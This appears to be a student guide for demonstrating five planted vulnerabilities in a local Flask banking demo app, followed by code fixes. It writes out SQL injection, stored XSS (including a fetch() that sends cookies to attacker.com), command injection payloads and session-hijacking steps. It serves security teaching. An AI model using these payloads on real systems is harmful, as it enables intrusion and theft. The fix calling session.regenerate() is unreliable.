# 🎯 DETAILED ATTACK DEMONSTRATION GUIDE

**RMIT NeoBank - 5 Security Vulnerabilities**

---

## 📋 ATTACK 1: SQL INJECTION (CWE-89)

### **Vulnerability Location**

- **Endpoint**: `/applications` (Search Applications page)
- **File**: `app.py` line 388
- **Vulnerable Code**:

```python
raw_sql = f"SELECT * FROM loan_applications WHERE applicant_name LIKE '%{search_query}%'"
```

### **Step-by-Step Attack Demo**

#### **Setup:**

1. Start Flask server: `python app.py`
2. Browser: `http://127.0.0.1:5000/login`
3. Login: Username: `bo_hcm01_1` | Password: `Password123`

#### **Attack Execution:**

1. Click **"Applications"** in navbar
2. You should see ONLY HCM01 branch applications (~152 records)
3. In the search box, enter:
   ```sql
   ' OR 1=1 --
   ```
4. Click **Search**

#### **Expected Result - WHAT YOU SEE ON SCREEN:**

- ✅ Results table shows **457 applications** (all branches)
- ✅ Branch codes visible: **HCM01, HCM02, HN01, HN02, DN01**
- ✅ You've bypassed branch-level access control
- ✅ Clean professional UI (no warning boxes)

#### **Advanced Payload (Extract User Data):**

```sql
' UNION SELECT id, username, password_hash, full_name, branch_code, role, NULL, NULL, NULL FROM users --
```

- Shows user accounts as "loan applications"
- Exposes password hashes

#### **Screenshot Evidence:**

- Capture: Results table showing multiple branch codes
- Highlight: Total records count (457 vs your authorized ~152)

---

## 📋 ATTACK 2: IDOR - INSECURE DIRECT OBJECT REFERENCE (CWE-639)

### **Vulnerability Location**

- **Endpoint**: `/applications/<int:app_id>`
- **File**: `app.py` line 558
- **Vulnerable Code**: NO access control check:

```python
# VULNERABLE: NO access control check - IDOR vulnerability
application = LoanApplication.query.get_or_404(app_id)
# Missing: if application.branch_code != current_user.branch_code: abort(403)
```

### **Step-by-Step Attack Demo**

#### **Setup:**

1. Already logged in as `bo_hcm01_1` (HCM01 branch)
2. Go to **Applications** page

#### **Attack Execution:**

1. Click any application to view details
2. Note the URL: `http://127.0.0.1:5000/applications/123`
3. **Manually change the ID in browser address bar**:
   - Try: `http://127.0.0.1:5000/applications/1`
   - Try: `http://127.0.0.1:5000/applications/5`
   - Try: `http://127.0.0.1:5000/applications/10`
   - Try: `http://127.0.0.1:5000/applications/20`
   - Try: `http://127.0.0.1:5000/applications/50`

#### **Expected Result - WHAT YOU SEE ON SCREEN:**

- ✅ Full application details from **OTHER BRANCHES** (HN01, DN01, HCM02)
- ✅ Sensitive customer data visible:
  - National ID number
  - Phone number
  - Email address
  - Loan amount
  - Credit score
  - CIC credit report
- ✅ Branch code shows it's NOT your branch
- ✅ **No "Access Denied" message**

#### **Screenshot Evidence:**

- Capture: Application detail page showing branch code HN01 or DN01
- Highlight: Your user profile shows HCM01, but viewing HN01 data

---

## 📋 ATTACK 3: XSS - STORED CROSS-SITE SCRIPTING (CWE-79)

### **Vulnerability Location**

- **Endpoint**: `/applications/new` (Create Application form)
- **File**: `templates/application_detail.html` line 138
- **Vulnerable Code**:

```django-html
{{ application.remarks | safe }}
```

### **Step-by-Step Attack Demo**

#### **Setup:**

1. Logged in as `bo_hcm01_1`
2. Go to **Applications** → Click **"New Application"**

#### **Attack Execution:**

1. Fill in application form with valid data:

   - **Applicant Name**: XSS Test User
   - **National ID**: 999888777
   - **Date of Birth**: 1990-01-01
   - **Phone**: 0901234567
   - **Email**: xsstest@test.com
   - **Product**: Personal Loan
   - **Loan Amount**: 100000000
   - **Tenure**: 24 months
2. In **"Remarks / Notes"** field, enter:

   ```html
   <script>alert('XSS ATTACK - SESSION STOLEN!')</script>
   ```
3. Click **Submit**

#### **Expected Result - WHAT YOU SEE ON SCREEN:**

- ✅ Application created successfully
- ✅ Redirected to application list
- ✅ Click the newly created application
- ✅ **JavaScript alert popup appears**: "XSS ATTACK - SESSION STOLEN!"
- ✅ Script executes every time ANYONE views this application

#### **Advanced Payload (Cookie Theft):**

```html
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>
```

(Won't work without attacker server, but shows concept)

#### **Alternative Visual Payload:**

```html
<h1 style="color:red">HACKED BY ATTACKER</h1>
<img src="x" onerror="alert('XSS!')">
```

#### **Screenshot Evidence:**

- Capture: Alert popup on application detail page
- Capture: Remarks section showing HTML/JavaScript rendered

---

## 📋 ATTACK 4: COMMAND INJECTION (CWE-78)

### **Vulnerability Location**

- **Endpoint**: `/import` (Bulk Import page)
- **File**: `app.py` line 1151
- **Vulnerable Code**:

```python
command = f"python scripts/import_applications.py {filename}"
# os.system(command)  # Would execute if uncommented
```

### **Step-by-Step Attack Demo**

#### **Setup:**

1. Logout from current session
2. Login as **HO Officer**: Username: `ho_hcm01_1` | Password: `Password123`
   - (Only HO officers can access import page)

#### **Attack Execution:**

1. Click **"Import Data"** in navbar
2. You'll see clean blue import form
3. In **"Enter filename"** field, enter:
   ```bash
   data.csv & whoami
   ```
4. Click **"Import Data"**

#### **Expected Result - WHAT YOU SEE ON SCREEN:**

- ✅ **Red alert box appears**: "🚨 COMMAND INJECTION DETECTED!"
- ✅ Message: "Shell metacharacters found: &"
- ✅ Shows: "Command would execute: python scripts/import_applications.py data.csv & whoami"
- ✅ This **detection mechanism proves the vulnerability exists**

#### **Other Payloads to Try:**

```bash
data.csv | dir
data.csv; ls -la
data.csv && echo HACKED
```

#### **Why This Shows Vulnerability:**

- System detects shell metacharacters `& | ; < >`
- Detection code (line 1161) proves these characters would execute commands
- In real vulnerable system, `whoami` would run and show username

#### **Screenshot Evidence:**

- Capture: Red danger alert showing "COMMAND INJECTION DETECTED"
- Highlight: The payload you entered with shell metacharacters

---

## 📋 ATTACK 5: SESSION FIXATION/HIJACKING (CWE-384)

### **Vulnerability Location**

- **Files**: `app.py` lines 87-89, `security.py` lines 120-145
- **Vulnerable Configuration**:

```python
# COMMENTED OUT - THESE ARE DISABLED:
# app.config["SESSION_COOKIE_SECURE"] = True  # HTTPS only
# app.config["SESSION_COOKIE_HTTPONLY"] = True  # No JavaScript access
# app.config["SESSION_COOKIE_SAMESITE"] = "Lax"  # CSRF protection
```

### **Step-by-Step Attack Demo**

#### **Part A: Cookie Theft via XSS (Combined Attack)**

**Setup:**

1. Use the XSS vulnerability from Attack 3 above
2. Create application with this payload in remarks:
   ```html
   <script>
   alert('Session Cookie: ' + document.cookie);
   </script>
   ```

**Attack Execution:**

1. Submit application with XSS payload
2. View the application
3. Alert popup shows session cookie

**Expected Result - WHAT YOU SEE:**

- ✅ Alert shows: `session=eyJ...` (Flask session cookie)
- ✅ Cookie is accessible to JavaScript (HTTPOnly disabled)
- ✅ Attacker can steal this cookie

---

#### **Part B: Session Hijacking Demo**

**⚠️ CRITICAL: Use the SAME domain in both windows (localhost OR 127.0.0.1, not mixed)**

**Demonstration Using Browser DevTools:**

1. **Capture Valid Session Cookie (Victim Browser):**

   - Go to `http://localhost:5000` (**Use localhost, not 127.0.0.1**)
   - Login as `bo_hcm01_1` / `Password123`
   - Open DevTools (F12) → **Application** tab → **Cookies** → `http://localhost:5000`
   - Click on cookie named **`session`**
   - In the **Value** field (right panel), **triple-click to select all**
   - Copy (Ctrl+C) - should be 200+ characters
   - Example: `eyJicmFuY2hfY29kZSI6IkhDTTAxIiwiZnVs...`
   - **Keep this window open** (closing it may expire the session)

2. **Open Incognito Window (Simulate Attacker):**

   - Press Ctrl+Shift+N (Chrome) or Ctrl+Shift+P (Firefox)
   - Go to `http://localhost:5000` (**SAME DOMAIN as step 1**)
   - You should see the login page
   - Open DevTools (F12) → **Application** → **Cookies**

3. **Inject Stolen Cookie:**

   - In the Cookies panel, right-click → **Add new cookie** (or click **+** icon)
   - Fill in:
     - **Name**: `session`
     - **Value**: (Ctrl+V paste the stolen cookie - all 200+ characters)
     - **Domain**: `localhost` (**MUST MATCH step 1**)
     - **Path**: `/`
     - Leave other fields blank
   - Click outside or press Enter to save
   - **Refresh page** (F5)

4. **Expected Result - WHAT YOU SEE:**

   - ✅ Page redirects to dashboard (no login prompt)
   - ✅ Shows "Welcome, Nguyen Van A (Branch Officer)"
   - ✅ Attacker is now logged in as `bo_hcm01_1`
   - ✅ Can access all victim's data and applications
   - ✅ Can perform actions as victim
   - ✅ **No password needed** - Session hijack successful!

**Troubleshooting:**

❌ **If still shows login page after refresh:**

**Problem 1: Domain Mismatch**
- Check if you used `localhost` in step 1 but `127.0.0.1` in step 3
- **Solution**: Use `localhost` in BOTH windows

**Problem 2: Incomplete Cookie Copy**
- Cookie value might be truncated (should be 200+ characters)
- **Solution**: Triple-click in Value field to select all, then copy

**Problem 3: Cookie Not Saved**
- Browser might not have saved the cookie
- **Solution**: After adding cookie, look for it in the list. If missing, try Console method:
  ```javascript
  // In incognito DevTools Console (F12 → Console):
  document.cookie = "session=YOUR_COOKIE_VALUE_HERE; path=/";
  // Then refresh (F5)
  ```

**Verify Cookie Validity:**
```powershell
# Run this to test if cookie is valid:
python debug_session.py
# Paste cookie value when prompted
```

---

#### **Part C: Session Fixation Demo**

**Attack Scenario:**

1. Attacker creates their own session before victim logs in
2. Tricks victim into using that session ID
3. After victim logs in, attacker uses same session

**Demonstration:**

1. **Before Login:**

   - Go to `http://localhost:5000/login` (NOT logged in)
   - Open DevTools → Application → Cookies → `http://localhost:5000`
   - Note: Flask creates session cookie even before login
   - Copy this pre-auth session value
2. **Login Process:**

   - Login as `bo_hcm01_1`
   - Check cookie value - **IT DOESN'T CHANGE**
   - Session ID is NOT regenerated on login
3. **Proof of Vulnerability:**

   - ✅ Session ID stays the same before/after login
   - ✅ Missing: `session.clear()` followed by new session creation
   - ✅ Attacker can "fix" session before victim logs in

---

### **Session Attack - Screenshot Evidence:**

**For Cookie Theft:**

- DevTools showing `document.cookie` accessible
- Alert popup with session cookie value

**For Session Hijacking:**

- Side-by-side: Original browser (logged in) + Incognito window (hijacked)
- Both showing same user dashboard

**For Session Fixation:**

- DevTools showing session cookie value before login
- Same cookie value after login (no regeneration)

---

## 🎬 COMPLETE ATTACK DEMO SEQUENCE

### **Recommended Presentation Order:**

1. **Start Simple - SQL Injection** (2 minutes)

   - Easy to show: Type payload → See all data
   - Visual impact: 152 records → 457 records
2. **IDOR - URL Manipulation** (1 minute)

   - Quick demo: Change URL → Access forbidden data
   - Shows horizontal privilege escalation
3. **XSS - JavaScript Execution** (1.5 minutes)

   - Create malicious application
   - Show alert popup
   - Explain cookie theft potential
4. **Command Injection** (1 minute)

   - Show detection alert
   - Explain what would happen if executed
5. **Session Hijacking** (1.5 minutes)

   - Show cookie in DevTools
   - Demo incognito hijacking
   - Most impressive visual

---

## 📊 ATTACK IMPACT SUMMARY

| Attack                      | Visual Proof                     | Real-World Impact                        |
| --------------------------- | -------------------------------- | ---------------------------------------- |
| **SQL Injection**     | 457 records shown (all branches) | Database breach, credential theft        |
| **IDOR**              | View HN01/DN01 applications      | Customer PII exposure, privacy violation |
| **XSS**               | Alert popup executes             | Session theft, malware distribution      |
| **Command Injection** | Red detection alert              | Server takeover, ransomware              |
| **Session Hijacking** | Login without password           | Account takeover, fraud                  |

---

## 🛡️ PYTHON CODE FIXES (Brief Reference)

### **SQL Injection Fix:**

```python
# BEFORE (Vulnerable):
raw_sql = f"SELECT * FROM loan_applications WHERE applicant_name LIKE '%{search_query}%'"

# AFTER (Secure):
query = LoanApplication.query.filter(
    LoanApplication.applicant_name.ilike(f"%{search_query}%")
)
```

### **IDOR Fix:**

```python
# Add after line 558:
if application.branch_code != current_user.branch_code and current_user.role != Role.SUPER_ADMIN:
    abort(403, "Access denied: Not your branch")
```

### **XSS Fix:**

```django-html
<!-- BEFORE (Vulnerable): -->
{{ application.remarks | safe }}

<!-- AFTER (Secure): -->
{{ application.remarks }}
```

### **Command Injection Fix:**

```python
# BEFORE: Shell command execution
os.system(f"python scripts/import.py {filename}")

# AFTER: File upload + CSV parsing (lines 1187-1350)
file = request.files.get('csv_file')
file.save(filepath)
with open(filepath) as f:
    reader = csv.DictReader(f)
```

### **Session Hijacking Fix:**

```python
# Uncomment lines 87-89 in app.py:
app.config["SESSION_COOKIE_SECURE"] = True
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"

# Add session regeneration on login (security.py line 120):
def login_user(user: User):
    session.clear()  # ✅ Already there
    session.regenerate()  # ADD THIS (Flask 3.0+)
    session["user_id"] = user.id
```

---

## ✅ TESTING CHECKLIST

- [ ] SQL Injection: Search shows 457 records (all branches)
- [ ] IDOR: Access `/applications/1`, `/applications/5` (other branches)
- [ ] XSS: Alert popup appears when viewing application
- [ ] Command Injection: Red alert "COMMAND INJECTION DETECTED"
- [ ] Session Hijacking: Incognito window logs in with stolen cookie

---

**Last Updated**: December 16, 2025
**Total Demo Time**: ~7 minutes (perfect for presentation)
**All attacks verified working in current codebase**
